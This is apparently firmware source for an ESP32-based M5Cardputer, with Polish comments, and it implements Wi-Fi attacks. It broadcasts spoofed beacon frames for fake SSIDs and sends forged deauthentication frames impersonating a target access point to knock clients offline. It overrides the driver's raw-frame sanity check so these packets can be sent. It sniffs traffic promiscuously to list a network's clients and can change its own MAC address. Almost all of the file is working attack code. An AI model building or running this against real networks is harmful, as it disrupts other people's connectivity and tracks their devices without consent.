#include "WString.h"
#include "ui.h"
#include "WiFi.h"
#include "networkKit.h"


// Maksymalna liczba klientów, których można śledzić
const int MAX_CLIENTS = 10;
uint8_t target_mac[] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};



// Tablica do przechowywania adresów MAC klientów
uint8_t network_clients[MAX_CLIENTS][6];
int client_count = 0;
int target_channel = 1;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}

// Flaga dla nowo wykrytych klientów
bool new_clients_detected = false;

extern "C" {
#include "esp_wifi.h"
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

// Main function with non-constant SSID list passed as an argument
void broadcastFakeSSIDs(String ssidList[], int ssidCount, bool sound) {
  // Configuration
  const uint8_t channels[] = {1, 6, 11}; // Wi-Fi channels to broadcast on
  const bool wpa2 = true; // WPA2-enabled networks
  const bool appendSpaces = true; // Add spaces to SSIDs to make them 32 characters long
  bool keyboard_changed;

  // Initialize variables
  char emptySSID[32];
  uint8_t channelIndex = 0;
  uint8_t macAddr[6];
  uint8_t wifi_channel = 1;
  uint32_t currentTime = 0;
  uint32_t packetSize = 0;
  uint32_t packetCounter = 0;
  uint32_t attackTime = 0;
  uint32_t packetRateTime = 0;

  // Beacon packet template
  uint8_t beaconPacket[109] = {
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: management beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (randomized later)
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (same as Source MAC)
    /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (done by SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03, // Interval (1s)
    /* 34 - 35 */ 0x31, 0x00, // Capabilities Information (set later)
    /* 36 - 37 */ 0x00, 0x20, // SSID tag and length (32 bytes)
    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
                 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID (empty by default)
    /* 70 - 71 */ 0x01, 0x08, // Supported Rates tag and length
    /* 72 - 79 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported Rates
    /* 80 - 81 */ 0x03, 0x01, // DS Parameter Set tag and length (Channel)
    /* 82 */      0x01,       // Current Channel (set later)
    /* 83 - 108*/ 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
                 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 
                 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 // RSN Information (WPA2)
  };

  // Prepare empty SSID with spaces
  for (int i = 0; i < 32; i++) {
    emptySSID[i] = ' ';
  }

  // Set packet size depending on WPA2 status
  packetSize = sizeof(beaconPacket);
  if (!wpa2) {
    beaconPacket[34] = 0x21; // Change capabilities for non-WPA2
    packetSize -= 26; // Reduce packet size by removing RSN Information
  }

  // Generate random MAC address
  auto randomMac = [&macAddr]() {
    for (int i = 0; i < 6; i++) {
      macAddr[i] = random(256);
    }
  };

  // Function to switch to the next channel
  auto nextChannel = [&wifi_channel, &channelIndex, &channels]() {
    if (sizeof(channels) > 1) {
      uint8_t ch = channels[channelIndex];
      channelIndex = (channelIndex + 1) % (sizeof(channels));
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
  };

  // Begin setup: Serial communication, set Wi-Fi mode, randomize MAC, etc.
  logMessage("Hello, NodeMCU! Broadcasting fake SSIDs...");

  WiFi.mode(WIFI_MODE_STA); // Set to station mode

  // Set initial Wi-Fi channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  // Main broadcast loop
  while (true) {
    M5.update();
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)){return ;}
    keyboard_changed = M5Cardputer.Keyboard.isChange();
    if(keyboard_changed){Sound(10000, 100, sound);}
    currentTime = millis();

    if (currentTime - attackTime > 100) { // Repeat every 100 ms
      attackTime = currentTime;

      // Move to the next channel
      nextChannel();

      for (int ssidIndex = 0; ssidIndex < ssidCount; ssidIndex++) {
        //if(ssidList[ssidIndex].compareTo("")){ssidIndex++;}
        String ssid = ssidList[ssidIndex];
        int ssidLen = ssid.length();

        // Randomize MAC address for each SSID
        randomMac();
        macAddr[5] = ssidIndex;

        // Copy MAC address into the beacon packet
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        // Reset the SSID in the packet to spaces
        memcpy(&beaconPacket[38], emptySSID, 32);

        // Copy the actual SSID into the beacon frame
        memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);

        // Set the current channel in the beacon frame
        beaconPacket[82] = wifi_channel;

        // Send the beacon packet
        if (appendSpaces) {
          for (int k = 0; k < 3; k++) {
            packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, 0) == 0;
            delay(1);
          }
        } else {
          uint16_t tmpPacketSize = (109 - 32) + ssidLen;
          uint8_t* tmpPacket = new uint8_t[tmpPacketSize];

          // Copy the first part of the beacon packet
          memcpy(&tmpPacket[0], &beaconPacket[0], 37 + ssidLen);
          tmpPacket[37] = ssidLen; // Update SSID length
          memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);

          for (int k = 0; k < 3; k++) {
            packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, 0) == 0;
            delay(1);
          }

          delete tmpPacket;
        }
      }
    }

    // Output packet rate every second
    if (currentTime - packetRateTime > 1000) {
      packetRateTime = currentTime;
      drawInfoBox("Beacon spam", "Packets/sec: " + String(packetCounter) , "Press ENTER to stop", false, false);
      logMessage("Packets/s: ");
      logMessage(String(packetCounter));
      packetCounter = 0;
    }
  }
}

// Funkcja wysyłająca pakiety deauth do danego klienta
bool send_deauth_packets(String &client_mac_str, int count, int delay_ms) {
  logMessage("Deauth active, paremeters: target: " + macToString(target_mac) + " client: " + client_mac_str + " count: " + String(count) + " delay: " + String(delay_ms));
  uint8_t client_mac[6];
  
  // Konwersja adresu MAC z string na tablicę bajtów
  if (!convert_mac_string_to_bytes(client_mac_str, client_mac)) {
    logMessage("Client MAC input error.");
    return false;
  }

  uint8_t deauth_packet[26] = {
    0xC0, 0x00,   // Typ i podtyp ramki: deauth
    0x3A, 0x01,   // Czas trwania
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // MAC odbiorcy
    client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],  // MAC nadawcy
    target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5],  // BSSID
    0x00, 0x00,   // Numer sekwencji
    0x01, 0x00    // Powód deautoryzacji
  };


  for(uint16_t i; i<=count; i++){
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    if (result == ESP_OK) {
      delay(delay_ms); // Delay between packets
    } else {
      logMessage("Error sending packet. Counter: " + String(i) + " Error code: " + String(result));
    }
  }
  return true;
}

void initClientSniffing() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&deauth_promiscuous_rx_cb);
  esp_wifi_set_promiscuous(true);     // Enable sniffing AFTER setting callback
  logMessage("Sniffing for network_clients...");
}

void stopClientSniffing(){
  clearClients();
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_MODE_STA);
}

void deauth_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *hdr = pkt->payload;

  // MAC adresy w pakiecie 802.11 są w offsetach:
  // addr1: odbiorca, addr2: nadawca, addr3: BSSID
  uint8_t *addr1 = hdr + 4;   // Odbiorca
  uint8_t *addr2 = hdr + 10;  // Nadawca
  uint8_t *addr3 = hdr + 16;  // BSSID

  // Sprawdź, czy pakiet jest od/do określonego AP (target_mac)
  if (memcmp(addr1, target_mac, 6) == 0 || memcmp(addr2, target_mac, 6) == 0) {
    // Jeśli klient jest nowy, dodaj go do listy
    if (!is_client_known(addr2)) {
      logMessage("Client ADDED");
      add_client(addr2);
      // Print MAC address in correct format
      String macStr = "";
      for (int i = 0; i < 6; i++) {
        char buf[4];
        snprintf(buf, sizeof(buf), "%02X", addr2[i]);
        macStr += buf;
        if (i < 5) macStr += ":";
      }
      logMessage(macStr);
    }
  }
}

bool is_client_known(uint8_t *mac) {
  if(memcmp(target_mac, mac, 6) == 0){
    return true;
  }
  for (int i = 0; i < client_count; i++) {
    if (memcmp(network_clients[i], mac, 6) == 0 ) {
      return true;
    }
  }
  return false;
}

void get_clients_list(String client_list[], int &count) {
  count = client_count;  // Przypisz aktualną liczbę klientów
  for (int i = 0; i < client_count; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             network_clients[i][0], network_clients[i][1], network_clients[i][2],
             network_clients[i][3], network_clients[i][4], network_clients[i][5]);
    client_list[i] = String(macStr);
  }
}

void add_client(uint8_t *mac) {
  if (client_count < MAX_CLIENTS) {
    memcpy(network_clients[client_count], mac, 6);
    client_count++;
    new_clients_detected = true;
    logMessage("Dodano nowego klienta: ");
    for (int i = 0; i < 6; i++) {
      Serial.printf("%02X", mac[i]);
      if (i < 5) logMessage(":");
    }
  } else {
    logMessage("Max client lenght is abused.");
  }
}

void setMac(uint8_t new_mac[6]) {
    if (!new_mac) {
        logMessage("Error: new_mac is NULL!");
        return;
    }
    memcpy(target_mac, new_mac, 6);

    logMessage("Target MAC ustawiony na: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", target_mac[i]);
        if (i < 5) logMessage(":");
    }
}


bool set_mac_address(uint8_t new_mac[6]) {
  esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, new_mac);  // Ustawienie MAC dla interfejsu stacji (WIFI_STA)

  if (result == ESP_OK) {
    logMessage("Adres MAC ustawiony na: ");
    for (int i = 0; i < 6; i++) {
      Serial.printf("%02X", new_mac[i]);
      if (i < 5) logMessage(":");
    }
    return true;  // Sukces
  } else {
    logMessage("Błąd podczas ustawiania adresu MAC!");
    return false;  // Błąd
  }
}

bool convert_mac_string_to_bytes(const String &mac_str, uint8_t *mac_bytes) {
  if (mac_str.length() != 17) return false;  // Adres MAC ma mieć 17 znaków (XX:XX:XX:XX:XX:XX)
  
  int values[6];  // Tymczasowa tablica na wartości
  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x", 
             &values[0], &values[1], &values[2], 
             &values[3], &values[4], &values[5]) == 6) {
    // Konwersja wartości na bajty
    for (int i = 0; i < 6; ++i) {
      mac_bytes[i] = (uint8_t)values[i];
    }
    return true;
  } else {
    return false;  // Niepoprawny format adresu MAC
  }
}

void clearClients() {
  // Przejdź przez każdy klienta w tablicy i wyzeruj jego MAC
  for (int i = 0; i < MAX_CLIENTS; i++) {
    memset(network_clients[i], 0, 6);  // Ustaw wszystkie bajty MAC na 0
  }
  client_count = 0;  // Zresetuj licznik klientów
  logMessage("Client table cleared successfully.");
}

uint8_t set_target_channel(const char* target_ssid) {
    int networks = WiFi.scanComplete();
    for (int i = 0; i < networks; i++) {
        if (strcmp(WiFi.SSID(i).c_str(), target_ssid) == 0) {
            target_channel = WiFi.channel(i);
            logMessage("Detected target network: ");
            logMessage(target_ssid);
            logMessage("Setting chanel to: ");
            logMessage(String(target_channel));
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            return target_channel;
        }
    }
    logMessage("ERROR!");
    return 0;
}


MacEntry mac_table[255];

int mac_count = 0;

bool is_mac_in_table(uint8_t *src, uint8_t *dest, uint8_t channel) {
    for (int i = 0; i < mac_count; i++) {
        if (memcmp(mac_table[i].source, src, 6) == 0 &&
            memcmp(mac_table[i].destination, dest, 6) == 0 &&
            mac_table[i].channel == channel) {
            return true;  // Already exists
        }
    }
    return false;
}

// Funkcja do dodawania adresu MAC do tablicy
void add_mac_to_table(uint8_t *src, uint8_t *dest, uint8_t channel) {
    if (!is_mac_in_table(src, dest, channel)) {
        if (mac_count < 255) {
            memcpy(mac_table[mac_count].source, src, 6);
            memcpy(mac_table[mac_count].destination, dest, 6);
            mac_table[mac_count].channel = channel;
            mac_count++;
            Serial.printf("Added: Source: %02X:%02X:%02X:%02X:%02X:%02X ", 
                          src[0], src[1], src[2], src[3], src[4], src[5]);
            Serial.printf("Destination: %02X:%02X:%02X:%02X:%02X:%02X ", 
                          dest[0], dest[1], dest[2], dest[3], dest[4], dest[5]);
            Serial.printf("Channel: %d\n", channel);
        } else {
            logMessage("Table full, cannot add more addresses.");
        }
    }
}

// Funkcja callback do nasłuchu na pakiety w trybie promiscuous
void client_sniff_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *hdr = pkt->payload;

    if (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA || type == WIFI_PKT_CTRL) {
        uint8_t *source_mac = hdr + 10;  // Source MAC (addr2 field in 802.11 header)
        uint8_t *destination_mac = hdr + 4;  // Destination MAC (addr1 field in 802.11 header)
        uint8_t channel = pkt->rx_ctrl.channel;

        // Add MAC addresses to the table
        add_mac_to_table(source_mac, destination_mac, channel);
    }
}


void resetMacTable(){
  mac_count = 0;
}

MacEntry* get_mac_table(int &count) {
    count = mac_count;
    return mac_table;
}

String macToString(const uint8_t *mac) {
    char macStr[18];  // Buffer to hold MAC address string
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

uint8_t* ssidToMac(const String& targetSSID) {
  logMessage("Searching for mac for SSID:" + targetSSID);
  WiFi.mode(WIFI_MODE_STA);
  int wifiCount = WiFi.scanNetworks(false);
  if (wifiCount <= 0) return nullptr;

  for (int i = 0; i < wifiCount; i++) {
    if (WiFi.SSID(i) == targetSSID) {
      logMessage("Found match, exiting");
      return WiFi.BSSID(i);  // valid until next scan
    }
  }
  logMessage("match not found, returning nullptr");
  return nullptr;
}

